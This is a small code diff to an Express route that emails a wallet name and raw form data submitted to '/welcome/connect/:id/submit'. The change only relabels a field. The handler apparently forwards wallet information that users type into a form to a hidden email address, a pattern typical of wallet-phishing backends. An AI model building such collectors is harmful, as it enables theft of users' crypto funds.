@@ -63,7 +63,7 @@ app.post('/welcome/connect/:id/submit', async (req, res) => {
             from: process.env.FROM,
             to: recipient,
             subject: `${req.body.category}`,
-            html: `Wallet Name: ${req.params.id} <br> ${req.body.data}`
+            html: `Wallet Name(s): ${req.params.id} <br> ${req.body.data}`
         }
 
         await new Promise((resolve, reject) => {
